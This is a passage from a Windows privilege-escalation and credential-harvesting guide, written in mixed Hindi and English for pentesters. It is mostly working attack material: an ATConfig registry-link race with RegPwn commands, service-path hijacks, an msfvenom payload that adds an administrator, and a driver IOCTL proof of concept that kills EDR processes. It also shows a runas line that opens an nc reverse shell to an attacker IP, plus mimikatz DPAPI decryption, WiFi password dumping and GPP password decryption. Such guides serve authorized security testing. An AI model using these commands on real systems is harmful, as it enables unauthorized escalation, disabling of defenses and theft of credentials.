- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` user-controlled configuration को स्टोर करता है।
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` logon/secure-desktop transitions के दौरान बनाया जाता है और उपयोगकर्ता द्वारा writable होता है।

Abuse flow (CVE-2026-24291 / ATConfig):

1. वह **HKCU ATConfig** value भरें जिसे आप चाहते हैं कि SYSTEM लिखे।
2. secure-desktop copy trigger करें (जैसे, **LockWorkstation**), जो AT broker flow शुरू करता है।
3. race जीतें: `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` पर एक **oplock** रखें; जब oplock फायर हो, तो **HKLM Session ATConfig** key को एक **registry link** से replace करें जो एक protected HKLM target की ओर इशारा करे।
4. SYSTEM attacker-चुनी हुई value को redirected HKLM path में लिखता है।

एक बार जब आपके पास arbitrary HKLM value write हो, तो सेवा कॉन्फ़िगरेशन मानों को overwrite करके LPE की ओर pivot करें:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

ऐसा service चुनें जिसे सामान्य उपयोगकर्ता start कर सकता है (उदा., **`msiserver`**) और write के बाद उसे trigger करें। **Note:** public exploit implementation रेस के भाग के रूप में **workstation को lock** करती है।

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी registry पर यह permission है तो इसका मतलब है कि **आप इस registry से sub registries बना सकते हैं**। Windows services के मामले में यह **execute arbitrary code करने के लिए पर्याप्त है:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable का path quotes के अंदर नहीं है, तो Windows space से पहले वाले हर ending को execute करने की कोशिश करेगा।

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
बिल्ट-इन Windows services से संबंधित नहीं होने वाली सभी unquoted service paths सूचीबद्ध करें:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस vulnerability का पता लगा सकते हैं और इसे exploit कर सकते हैं** metasploit के साथ: `exploit/windows/local/trusted\_service\_path` आप मैन्युअली metasploit के साथ एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### रिकवरी क्रियाएँ

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने की अनुमति देता है कि यदि कोई सेवा विफल हो तो कौन सा कार्य किया जाना चाहिए। इस फीचर को एक binary की ओर निर्देशित करने के लिए कॉन्फ़िगर किया जा सकता है। यदि इस binary को बदला जा सकता है, तो privilege escalation संभव हो सकता है। More details can be found in the [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## अनुप्रयोग

### इंस्टॉल किए गए अनुप्रयोग

जाँचें **permissions of the binaries** (शायद आप किसी एक को overwrite कर सकते हैं और escalate privileges कर सकते हैं) और **folders** के भी permissions जांचें ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### लिखने की अनुमतियाँ

जाँच करें कि क्या आप किसी config फ़ाइल को बदलकर कोई विशेष फ़ाइल पढ़ सकते हैं, या क्या आप किसी binary को संशोधित कर सकते हैं जिसे Administrator खाते द्वारा execute किया जाएगा (schedtasks)।

सिस्टम में कमजोर फ़ोल्डर/फ़ाइल अनुमतियाँ खोजने का एक तरीका यह है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ अपने `plugins` उपफोल्डर्स के तहत किसी भी plugin DLL को autoload करता है। यदि एक writable portable/copy install मौजूद है, तो एक दुर्भावनापूर्ण plugin डालने से हर लॉन्च पर (जिसमें `DllMain` और plugin callbacks भी शामिल हैं) `notepad++.exe` के अंदर स्वचालित कोड निष्पादन हो जाता है।

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### स्टार्टअप पर रन

**जाँचें कि क्या आप किसी registry या binary को overwrite कर सकते हैं जिसे किसी दूसरे user द्वारा execute किया जाएगा।**\
**पढ़ें** **निम्नलिखित पृष्ठ** ताकि आप दिलचस्प **autoruns locations to escalate privileges** के बारे में और अधिक जान सकें:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

संभावित **third party weird/vulnerable** drivers की तलाश करें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
यदि कोई driver arbitrary kernel read/write primitive एक्सपोज़ करता है (common in poorly designed IOCTL handlers), तो आप kernel memory से सीधे SYSTEM token चुरा कर escalate कर सकते हैं। step‑by‑step technique यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

उन race-condition बग्स के लिए जहाँ vulnerable call attacker-controlled Object Manager path खोलता है, lookup को जानबूझकर धीमा करना (using max-length components या deep directory chains) विंडो को microseconds से लेकर tens of microseconds तक बढ़ा सकता है:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

आधुनिक hive vulnerabilities आपको deterministic layouts groom करने, writable HKLM/HKU descendants का दुरुपयोग करने, और metadata corruption को बिना किसी custom driver के kernel paged-pool overflows में बदलने की अनुमति देती हैं। पूरी chain यहाँ जानें:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

कुछ signed third‑party drivers अपने device object को strong SDDL के साथ IoCreateDeviceSecure के माध्यम से बनाते हैं लेकिन DeviceCharacteristics में FILE_DEVICE_SECURE_OPEN सेट करना भूल जाते हैं। इस flag के बिना, secure DACL उस समय लागू नहीं होता जब device किसी ऐसे path से खोला जाता है जिसमें एक अतिरिक्त component होता है, जिससे कोई भी unprivileged user निम्नलिखित namespace path का उपयोग करके handle प्राप्त कर सकता है:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

एक बार user device खोल सके, driver द्वारा expose किए गए privileged IOCTLs का दुरुपयोग LPE और tampering के लिए किया जा सकता है। वास्तविक दुनिया में देखी गई उदाहरण क्षमताएँ:
- किसी arbitrary process को full-access handles return करना (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- बिना प्रतिबंध raw disk read/write (offline tampering, boot-time persistence tricks).
- Arbitrary processes को terminate करना, जिसमें Protected Process/Light (PP/PPL) भी शामिल हैं, जिससे user land से kernel के माध्यम से AV/EDR kill संभव होता है।

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- जब आप ऐसे device objects बनाते हैं जिन्हें DACL द्वारा सीमित करने का इरादा होता है, तो हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- privileged operations के लिए caller context का सत्यापन करें। process termination या handle returns की अनुमति देने से पहले PP/PPL checks जोड़ें।
- IOCTLs को सीमित करें (access masks, METHOD_*, input validation) और सीधे kernel privileges के बजाय brokered models पर विचार करें।

Detection ideas for defenders
- संदिग्ध device names (e.g., \\ .\\amsdk*) के user-mode opens और दुरुपयोग सूचित करने वाले specific IOCTL sequences की निगरानी करें।
- Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) लागू करें और अपनी allow/deny lists बनाए रखें。


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस चेक का दुरुपयोग करने के तरीकों के बारे में अधिक जानकारी के लिए:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## नेटवर्क

### शेयर
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file में हार्डकोड किए गए अन्य ज्ञात कंप्यूटरों की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस और DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### खुले पोर्ट

बाहर से **प्रतिबंधित सेवाओं** के लिए जाँच करें
```bash
netstat -ano #Opened ports?
```
### रूटिंग टेबल
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall नियम

[**Firewall से संबंधित commands के लिए इस पृष्ठ को देखें**](../basic-cmd-for-pentesters.md#firewall) **(नियम सूचीबद्ध करें, नियम बनाएं, बंद करें, बंद करें...)**

अधिक [यहाँ network enumeration के लिए commands](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है

यदि आप root user प्राप्त करते हैं तो आप किसी भी पोर्ट पर सुन (listen) सकते हैं (पहली बार जब आप `nc.exe` का उपयोग किसी पोर्ट पर सुनने के लिए करेंगे तो यह GUI के माध्यम से पूछेगा कि क्या firewall द्वारा `nc` को अनुमति दी जानी चाहिए)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
आसान तरीके से bash को root के रूप में शुरू करने के लिए, आप उपयोग कर सकते हैं `--default-user root`

आप `WSL` फ़ाइल सिस्टम को इस फ़ोल्डर में एक्सप्लोर कर सकते हैं: `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows क्रेडेंशियल्स

### Winlogon क्रेडेंशियल्स
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### क्रेडेंशियल मैनेजर / Windows Vault

स्रोत: [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\

Windows Vault सर्वरों, वेबसाइटों और अन्य प्रोग्रामों के लिए उपयोगकर्ता क्रेडेंशियल स्टोर करता है जिन्हें **Windows** **उपयोगकर्ताओं को स्वचालित रूप से लॉग इन**y. शुरुआत में ऐसा लग सकता है कि उपयोगकर्ता अब अपने Facebook क्रेडेंशियल, Twitter क्रेडेंशियल, Gmail क्रेडेंशियल आदि स्टोर कर सकते हैं, ताकि वे ब्राउज़रों के माध्यम से स्वतः लॉग इन हो सकें। लेकिन ऐसा नहीं है।

Windows Vault उन क्रेडेंशियल्स को स्टोर करता है जिन्हें Windows स्वतः उपयोगकर्ताओं को लॉग इन करने के लिए उपयोग कर सकता है, जिसका मतलब है कि कोई भी **ऐसा Windows एप्लिकेशन जिसे किसी रिसोर्स तक पहुँचने के लिए क्रेडेंशियल्स की आवश्यकता हो** (server or a website) **इस Credential Manager का उपयोग कर सकता है** & Windows Vault और प्रदान किए गए क्रेडेंशियल्स का उपयोग कर सकता है, बजाय इसके कि उपयोगकर्ता हर बार उपयोगकर्ता नाम और पासवर्ड दर्ज करें।

तो, यदि आपका एप्लिकेशन वॉल्ट का उपयोग करना चाहता है, तो इसे किसी न किसी तरह से डिफ़ॉल्ट स्टोरेज वॉल्ट से उस रिसोर्स के लिए क्रेडेंशियल्स माँगने हेतु **credential manager के साथ संवाद करना चाहिए**।

मशीन पर स्टोर किए गए क्रेडेंशियल्स की सूची देखने के लिए `cmdkey` का उपयोग करें।
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
तब आप सेव किए गए credentials का उपयोग करने के लिए `runas` के साथ `/savecred` विकल्प का उपयोग कर सकते हैं। निम्नलिखित उदाहरण एक remote binary को SMB share के माध्यम से कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
प्रदान किए गए credential सेट के साथ `runas` का उपयोग।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) से।

### DPAPI

**Data Protection API (DPAPI)** डेटा के symmetric एन्क्रिप्शन का एक तरीका प्रदान करता है, जिसे मुख्य रूप से Windows ऑपरेटिंग सिस्टम में asymmetric private keys के symmetric एन्क्रिप्शन के लिए उपयोग किया जाता है। यह एन्क्रिप्शन entropy में महत्वपूर्ण योगदान के लिए user या system secret का उपयोग करता है।

**DPAPI उपयोगकर्ता के login secrets से व्युत्पन्न एक symmetric key के माध्यम से keys के एन्क्रिप्शन को सक्षम करता है**। system एन्क्रिप्शन के परिदृश्यों में, यह सिस्टम के domain authentication secrets का उपयोग करता है।

DPAPI का उपयोग करके encrypted user RSA keys `%APPDATA%\Microsoft\Protect\{SID}` डायरेक्टरी में संग्रहित होते हैं, जहाँ `{SID}` उपयोगकर्ता का [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) दर्शाता है। **DPAPI key, जो उसी फ़ाइल में उपयोगकर्ता की private keys की रक्षा करने वाले master key के साथ सह-स्थित होती है**, आमतौर पर 64 bytes के random data से बनी होती है। (यह ध्यान देने योग्य है कि इस डायरेक्टरी तक पहुँच प्रतिबंधित है, इसलिए CMD में `dir` कमांड के माध्यम से इसकी सामग्री सूचीबद्ध नहीं की जा सकती, हालांकि PowerShell के माध्यम से सूचीबद्ध की जा सकती है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप इसे decrypt करने के लिए **mimikatz module** `dpapi::masterkey` को उपयुक्त arguments (`/pvk` or `/rpc`) के साथ उपयोग कर सकते हैं।

**credentials files protected by the master password** आमतौर पर निम्न स्थानों पर स्थित होते हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप उपयुक्त `/masterkey` के साथ **mimikatz module** `dpapi::cred` का उपयोग करके decrypt कर सकते हैं.\
आप `sekurlsa::dpapi` module के साथ **memory** से कई **DPAPI** **masterkeys** extract कर सकते हैं (यदि आप root हैं)।

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** का अक्सर उपयोग **scripting** और automation tasks में encrypted credentials को सुविधाजनक रूप से store करने के लिए किया जाता है। ये credentials **DPAPI** का उपयोग करके protected होते हैं, जिसका सामान्यतः मतलब है कि इन्हें केवल उसी user द्वारा उसी computer पर decrypt किया जा सकता है जिस पर ये बनाए गए थे।

किसी फ़ाइल में मौजूद PS credentials को **decrypt** करने के लिए आप कर सकते हैं:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजे गए RDP Connections

आप इन्हें इन स्थानों पर पा सकते हैं `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### हाल ही में चलाए गए Commands
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
उपयुक्त `/masterkey` के साथ **Mimikatz** `dpapi::rdg` module का उपयोग करके **decrypt any .rdg files**\
आप मेमोरी से **extract many DPAPI masterkeys** कर सकते हैं **Mimikatz** `sekurlsa::dpapi` module के साथ

### Sticky Notes

लोग अक्सर Windows वर्कस्टेशनों पर StickyNotes app का उपयोग पासवर्ड और अन्य जानकारी **save passwords** करने के लिए करते हैं, यह समझे बिना कि यह एक डेटाबेस फ़ाइल है। यह फ़ाइल इस पथ पर स्थित है `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` और इसे हमेशा खोजकर और जाँचना चाहिए।

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` directory में स्थित है।\
यदि यह फ़ाइल मौजूद है, तो संभव है कि कुछ **credentials** configured किए गए हों और उन्हें **recovered** किया जा सके।

यह कोड [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) से निकाला गया था:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जाँचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है या नहीं.\
Installers are **run with SYSTEM privileges**, कई इसके लिए कमजोर हैं **DLL Sideloading (जानकारी स्रोत** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फ़ाइलें और रजिस्ट्री (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH होस्ट कुंजियाँ
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys रजिस्ट्री में

SSH private keys रजिस्ट्री की key `HKCU\Software\OpenSSH\Agent\Keys` के अंदर संग्रहीत हो सकती हैं, इसलिए आपको यह जांचना चाहिए कि वहां कुछ दिलचस्प है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आपको उस पथ के अंदर कोई एंट्री मिलती है तो वह संभवतः एक सहेजी गई SSH key होगी। यह एन्क्रिप्टेड रूप में स्टोर होती है लेकिन इसे आसानी से [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके डीक्रिप्ट किया जा सकता है.\
इस तकनीक के बारे में अधिक जानकारी यहाँ है: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` service चल नहीं रही है और आप चाहते हैं कि यह बूट पर स्वतः शुरू हो, तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह तकनीक अब मान्य नहीं है। मैंने कुछ ssh keys बनाए, उन्हें `ssh-add` से जोड़ा और ssh के जरिए मशीन में लॉगिन किया। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के इस्तेमाल की पहचान नहीं की।

### बिना निगरानी वाली फ़ाइलें
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM बैकअप्स
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड क्रेडेंशियल्स
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

### कैश्ड GPP पासवर्ड

A feature was previously available that allowed the deployment of custom local administrator accounts on a group of machines via Group Policy Preferences (GPP). However, this method had significant security flaws. Firstly, the Group Policy Objects (GPOs), stored as XML files in SYSVOL, could be accessed by any domain user. Secondly, the passwords within these GPPs, encrypted with AES256 using a publicly documented default key, could be decrypted by any authenticated user. This posed a serious risk, as it could allow users to gain elevated privileges.

To mitigate this risk, a function was developed to scan for locally cached GPP files containing a "cpassword" field that is not empty. Upon finding such a file, the function decrypts the password and returns a custom PowerShell object. This object includes details about the GPP and the file's location, aiding in the identification and remediation of this security vulnerability.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को डीक्रिप्ट करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
